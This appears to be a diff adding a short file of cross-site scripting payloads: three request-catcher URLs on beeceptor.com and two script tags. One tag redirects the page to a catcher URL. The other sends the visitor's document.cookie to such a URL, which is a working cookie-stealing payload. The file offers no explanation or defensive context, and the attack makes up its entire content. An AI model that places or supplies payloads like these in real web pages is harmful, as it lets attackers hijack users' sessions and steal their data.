@@ -1,0 +1,7 @@
+https://suirhamsss.free.beeceptor.com
+https://suirhamkkkkk.free.beeceptor.com
+https://suirhamlll.free.beeceptor.com
+
+<script>window.location.href = "https://suirhamsss.free.beeceptor.com";</script>
+
+<script>window.location.href = "https://suirhamlll.free.beeceptor.com?cookie=" + document.cookie;</script>
